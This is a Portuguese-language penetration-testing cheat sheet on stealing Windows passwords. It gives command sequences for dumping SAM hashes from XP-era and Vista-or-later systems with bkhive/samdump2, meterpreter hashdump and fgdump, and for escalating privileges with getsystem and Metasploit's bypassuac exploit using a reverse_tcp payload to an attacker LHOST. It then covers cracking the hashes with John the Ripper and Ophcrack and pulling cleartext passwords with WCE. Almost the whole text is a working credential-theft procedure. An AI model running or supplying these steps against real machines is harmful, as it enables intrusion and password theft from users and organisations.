# Senha no Windows

## Windows XP, Windows Server 2003 ou inferior

### Capturando hash

Arquivo contendo os hashs de usuários:
C:/windows/system32/config/SAM
*Esse arquivo é criptografado, porém a chave fica dentro do arquivo system na mesma pasta.*
*Também não é possível efetuar o download desses arquivos via meterpreter.*

Contudo no diretório **C:/windows/repair** há um backup dos arquivos **SAM** e **system**, sendo possível efetuar o download via meterpreter.

Para descriptografar o arquivo SAM:
bkhive system bootkey.txt ==> Será gerado o bootkey
samdump2 sam bootkey.txt ==> Será gerado os hashs de senhas

Também é possível pegar os hashs através do comando do meterpreter:
materpreter > hashdump

Ou através do fgdump que no Kali Linux fica no diretório /usr/share/windows-binaries/fgdump/fgdump.exe:
meterpreter > upload /usr/share/windows-binaries/fgdump/fgdump.exe c:\
C:\> fgdump.exe ==> Será gerado dois arquivos, **127.0.0.1.cachedump** e **127.0.0.1.pwdump**.
C:\> type 127.0.0.1.cachedump ==> Para visualizar o arquivo que normalmente traz usuários de rede.
C:\> typr 127.0.0.1.pwdump ==> Para visualizar o arquivo.

### Quebrando hash

Quebrando o hash:
john hash.txt --format=lm --show

Quebrando o hash com wordlist personalizada:
john hash.txt --format=lm --wordlist=wordlist.txt --show

*Wordlist padrão: /usr/share/john/password.lst*

Outra opção é efetuar a quebra através do Ophcrack.
Baixe antes as tables do Ophcrack em **http://ophcrack.sourceforge.net/**.

## Windows Vista ou superior

No Windows 7 em muitos casos não é possível executar o hashdump pelo fato de não estar com um usuário do sistema. Porém o meterpreter tem uma função de escalar privilégio através do seguinte comando:
meterpreter > getsystem

Caso o comando getsystem não tenha efeito, podemos utilizar algum exploit para dar bypass em UAC:
msf > search bypassuac
msf > use exploit/windows/local/bypassuac
msf exploit(bypassuac) > sessions -l ==> Ou seja, é necessário ter uma sessão ativa em background. Veja o ID da sessão que usaremos no exploit.
msf exploit(bypassuac) > set SESSION 1
msf exploit(bypassuac) > set payload windows/meterpreter/reverse_tcp
msf exploit(bypassuac) > set LHOST 192.168.0.100
msf exploit(bypassuac) > set LPORT 443
msf exploit(bypassuac) > exploit
msf exploit(bypassuac) > session -i 2
meterpreter > getuid ==> Para ver o usuário.
meterpreter > getsystem ==> Para escalar o privilégio.
meterpreter > hashdump

Há uma outra opção de pegar o hashdump caso a opção acima apresente erro:
msf > use post/windows/gather/smart_hashdump
msf post(smart_hashdump) > set SESSION 2
msf post(smart_hashdump) > run

### Quebrando hash

Quebrando o hash:
john hash.txt --format=nt --show

Quebrando o hash com wordlist personalizada:
john hash.txt --format=nt --wordlist=wordlist.txt --show

*Wordlist padrão: /usr/share/john/password.lst*

Outra opção é efetuar a quebra através do Ophcrack.
Baixe antes as tables do Ophcrack em **http://ophcrack.sourceforge.net/**.


## Sequestro de senha através de WCE

Caminho padrão do WCE no Kali Linux:
/usr/share/wce/

Upload do WCE:
meterpreter > upload /usr/share/wce/wce-universal.exe c:/

Execução do WCE:
meterpreter > shell
C:\>wce-universal.exe
C:\>wce-universal.exe -w ==> Irá trazer a senha em texto claro.
